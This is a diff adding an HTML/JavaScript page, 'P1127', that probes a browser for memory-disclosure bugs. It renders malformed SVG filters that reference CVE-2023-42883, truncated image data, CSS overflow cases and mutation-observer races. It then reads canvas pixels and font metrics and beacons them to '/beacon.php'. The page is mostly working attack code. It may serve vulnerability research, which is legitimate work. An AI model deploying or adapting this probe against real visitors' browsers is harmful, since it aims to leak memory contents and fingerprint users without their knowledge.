@@ -1,0 +1,230 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1127</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex(n){return'0x'+n.toString(16);}
+
+log('phase','=== P1127: SVG OOB + MULTI-VECTOR ===');
+B('P1127-START','t='+Date.now());
+
+var results=[];
+function R(n,v){results.push(n+'='+v);log(v.indexOf('OOB')>=0||v.indexOf('LEAK')>=0?'win':v.indexOf('SAFE')>=0||v.indexOf('DEAD')>=0?'ok':'info',n+': '+v);}
+
+// ===== TEST 1: SVG filter chain OOB (CVE-2023-42883 angle) =====
+// Malformed SVG filters with extreme values can cause OOB reads in the filter pipeline
+var svgTests=0,svgCrashes=0;
+
+function testSVG(id,svgText){
+  try{
+    var div=document.createElement('div');
+    div.innerHTML=svgText;
+    document.body.appendChild(div);
+    document.body.offsetHeight; // Force render
+    // Read canvas pixels to capture any leaked data
+    try{
+      var canvas=document.createElement('canvas');
+      canvas.width=256;canvas.height=256;
+      var ctx=canvas.getContext('2d');
+      if(ctx){
+        var img=new Image();
+        var svgBlob=new Blob([svgText],{type:'image/svg+xml'});
+        var url=URL.createObjectURL(svgBlob);
+        img.onload=function(){
+          try{
+            ctx.drawImage(img,0,0);
+            var pd=ctx.getImageData(0,0,256,256);
+            var nz=0,sample=[];
+            for(var i=0;i<pd.data.length;i+=4){
+              var r=pd.data[i],g=pd.data[i+1],b=pd.data[i+2],a=pd.data[i+3];
+              if(r!==0||g!==0||b!==0||a!==0){
+                nz++;
+                if(sample.length<16)sample.push(hex(r)+','+hex(g)+','+hex(b)+','+hex(a));
+              }
+            }
+            if(nz>0)B('P1127-SVG-'+id,'nz='+nz+'|'+sample.join('|'));
+            R('SVG_'+id,'pixels_nz='+nz);
+          }catch(e){R('SVG_'+id+'_draw','tainted|'+e.message);}
+          URL.revokeObjectURL(url);
+        };
+        img.onerror=function(){R('SVG_'+id+'_img','err');URL.revokeObjectURL(url);};
+        img.src=url;
+      }
+    }catch(e){}
+    svgTests++;
+    setTimeout(function(){try{document.body.removeChild(div);}catch(e){}},100);
+    return true;
+  }catch(e){svgCrashes++;return false;}
+}
+
+// SVG Test A: Extreme filter dimensions (CVE-2023-42883 angle)
+testSVG('A1','<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><defs><filter id="f1" x="-50%" y="-50%" width="200%" height="200%" filterUnits="objectBoundingBox"><feGaussianBlur stdDeviation="999999"/></filter></defs><rect width="100" height="100" fill="red" filter="url(#f1)"/></svg>');
+
+// SVG Test B: Negative filter dimensions
+testSVG('B1','<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><defs><filter id="f2"><feOffset dx="-99999" dy="-99999"/><feGaussianBlur stdDeviation="0.001"/></filter></defs><rect width="100" height="100" fill="blue" filter="url(#f2)"/></svg>');
+
+// SVG Test C: feImage with data URI pointing to huge offset
+testSVG('C1','<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100"><defs><filter id="f3"><feImage xlink:href="data:image/svg+xml,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'65535\' height=\'65535\'><rect width=\'65535\' height=\'65535\' fill=\'red\'/></svg>" width="65535" height="65535"/></filter></defs><rect width="100" height="100" filter="url(#f3)"/></svg>');
+
+// SVG Test D: feConvolveMatrix with extreme kernel
+testSVG('D1','<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><defs><filter id="f4"><feConvolveMatrix order="1" kernelMatrix="99999999" divisor="0.00001" targetX="0" targetY="0"/></filter></defs><rect width="100" height="100" fill="green" filter="url(#f4)"/></svg>');
+
+// SVG Test E: feDisplacementMap with extreme scale
+testSVG('E1','<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><defs><filter id="f5"><feFlood flood-color="red" result="flood"/><feDisplacementMap in="SourceGraphic" in2="flood" scale="999999" xChannelSelector="R" yChannelSelector="G"/></filter></defs><rect width="100" height="100" fill="blue" filter="url(#f5)"/></svg>');
+
+// SVG Test F: Recursive filter reference
+testSVG('F1','<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><defs><filter id="f6"><feImage href="#r6" width="100" height="100"/></filter></defs><rect id="r6" width="100" height="100" fill="red" filter="url(#f6)"/></svg>');
+
+// SVG Test G: feTurbulence with extreme values
+testSVG('G1','<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><defs><filter id="f7"><feTurbulence baseFrequency="999999" numOctaves="100" seed="4294967295"/></filter></defs><rect width="100" height="100" filter="url(#f7)"/></svg>');
+
+// SVG Test H: feMorphology extreme radius
+testSVG('H1','<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><defs><filter id="f8"><feMorphology operator="erode" radius="65535"/></filter></defs><rect width="100" height="100" fill="red" filter="url(#f8)"/></svg>');
+
+// ===== TEST 2: Canvas measureText info leak =====
+// measureText can reveal font metrics that differ per system/build
+try{
+  var c=document.createElement('canvas');
+  var ctx=c.getContext('2d');
+  if(ctx){
+    var fonts=['serif','sans-serif','monospace','Arial','Helvetica','Times New Roman'];
+    var metrics=[];
+    for(var fi=0;fi<fonts.length;fi++){
+      ctx.font='16px '+fonts[fi];
+      var m=ctx.measureText('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789');
+      var mStr=fonts[fi]+'|w='+m.width;
+      // Check for extended TextMetrics (could leak layout info)
+      if(typeof m.actualBoundingBoxAscent!=='undefined')mStr+='|asc='+m.actualBoundingBoxAscent;
+      if(typeof m.actualBoundingBoxDescent!=='undefined')mStr+='|desc='+m.actualBoundingBoxDescent;
+      if(typeof m.fontBoundingBoxAscent!=='undefined')mStr+='|fAsc='+m.fontBoundingBoxAscent;
+      if(typeof m.alphabeticBaseline!=='undefined')mStr+='|ab='+m.alphabeticBaseline;
+      metrics.push(mStr);
+    }
+    R('METRICS',metrics.join(';'));
+    B('P1127-METRICS',metrics.join(';'));
+  }
+}catch(e){R('METRICS','FAIL|'+e.message);}
+
+// ===== TEST 3: Image decode edge cases =====
+// Malformed image data in various formats
+function testImage(id,dataURI){
+  try{
+    var img=new Image();
+    img.onload=function(){
+      try{
+        var c=document.createElement('canvas');
+        c.width=img.naturalWidth||256;c.height=img.naturalHeight||256;
+        var ctx=c.getContext('2d');
+        if(ctx){
+          ctx.drawImage(img,0,0);
+          var pd=ctx.getImageData(0,0,Math.min(c.width,256),Math.min(c.height,256));
+          var nz=0;
+          for(var i=0;i<pd.data.length;i++)if(pd.data[i]!==0)nz++;
+          R('IMG_'+id,'loaded|w='+img.naturalWidth+'|h='+img.naturalHeight+'|nz='+nz);
+        }
+      }catch(e){R('IMG_'+id,'tainted|'+e.message);}
+    };
+    img.onerror=function(){R('IMG_'+id,'err');};
+    img.src=dataURI;
+  }catch(e){R('IMG_'+id,'EXCEPT');}
+}
+
+// Truncated PNG header
+testImage('PNG_TRUNC','data:image/png;base64,iVBORw0KGgo=');
+// Malformed JPEG (truncated)
+testImage('JPG_TRUNC','data:image/jpeg;base64,/9j/4AAQSkZJRg==');
+// GIF with zero dimensions
+testImage('GIF_ZERO','data:image/gif;base64,R0lGODlhAAAAAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==');
+// BMP with extreme dimensions in header
+testImage('BMP_BIG','data:image/bmp;base64,Qk0+AAAAAAAAADYAAAAoAAAA////AAD///8AAQAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
+// WebP probe
+testImage('WEBP','data:image/webp;base64,UklGRh4AAABXRUJQVlA4IBIAAAAwAQCdASoBAAEAAQAcJYgCdAEO/hEAAA==');
+
+// ===== TEST 4: CSS calc() integer overflow =====
+try{
+  var calcDiv=document.createElement('div');
+  calcDiv.style.width='calc(999999999px * 999999999)';
+  document.body.appendChild(calcDiv);
+  document.body.offsetHeight;
+  var cw=calcDiv.offsetWidth;
+  R('CALC_OVERFLOW','w='+cw);
+  document.body.removeChild(calcDiv);
+}catch(e){R('CALC_OVERFLOW','EXCEPT|'+e.message);}
+
+// ===== TEST 5: CSS gradient with extreme stops =====
+try{
+  var gradDiv=document.createElement('div');
+  gradDiv.style.width='100px';gradDiv.style.height='100px';
+  gradDiv.style.background='linear-gradient(to right';
+  for(var i=0;i<1000;i++)gradDiv.style.background+=', hsl('+i+',100%,50%) '+(i*0.1)+'%';
+  gradDiv.style.background+=')';
+  document.body.appendChild(gradDiv);
+  document.body.offsetHeight;
+  R('GRAD_EXTREME','rendered');
+  document.body.removeChild(gradDiv);
+}catch(e){R('GRAD_EXTREME','EXCEPT|'+e.message);}
+
+// ===== TEST 6: DOM mutation during iteration =====
+try{
+  var container=document.createElement('div');
+  for(var i=0;i<100;i++){
+    var child=document.createElement('span');
+    child.textContent='N'+i;
+    container.appendChild(child);
+  }
+  document.body.appendChild(container);
+  // Mutation observer that modifies during observation
+  var mutations=0;
+  var observer=new MutationObserver(function(records){
+    mutations+=records.length;
+    if(mutations<50){
+      try{
+        var newNode=document.createElement('b');
+        newNode.textContent='M'+mutations;
+        container.appendChild(newNode);
+      }catch(e){}
+    }
+  });
+  observer.observe(container,{childList:true,subtree:true});
+  // Trigger mutations
+  for(var i=0;i<20;i++){
+    var n=document.createElement('i');
+    n.textContent='T'+i;
+    container.appendChild(n);
+  }
+  setTimeout(function(){
+    observer.disconnect();
+    R('MUTATION','count='+mutations+'|children='+container.childNodes.length);
+    document.body.removeChild(container);
+  },100);
+}catch(e){R('MUTATION','EXCEPT|'+e.message);}
+
+// ===== TEST 7: CSS @font-face + canvas fingerprint =====
+// Test if custom font metrics leak through canvas
+try{
+  var fst=document.createElement('style');
+  fst.textContent="@font-face{font-family:'testfont';src:local(Arial);}";
+  document.head.appendChild(fst);
+  var fc=document.createElement('canvas');
+  fc.width=200;fc.height=50;
+  var fctx=fc.getContext('2d');
+  if(fctx){
+    fctx.font="20px 'testfont'";
+    fctx.fillText('Hello World',10,30);
+    var fpd=fctx.getImageData(0,0,200,50);
+    var fnz=0;
+    for(var i=0;i<fpd.data.length;i++)if(fpd.data[i]!==0)fnz++;
+    R('FONT_CANVAS','nz='+fnz);
+  }
+  fst.remove();
+}catch(e){R('FONT_CANVAS','EXCEPT|'+e.message);}
+
+// ===== FINAL REPORT =====
+setTimeout(function(){
+  R('SVG_TOTAL','tests='+svgTests+'|crashes='+svgCrashes);
+  B('P1127-DONE',results.join('|'));
+  log('phase','=== ALL TESTS COMPLETE ===');
+},2000);
+</script></body></html>
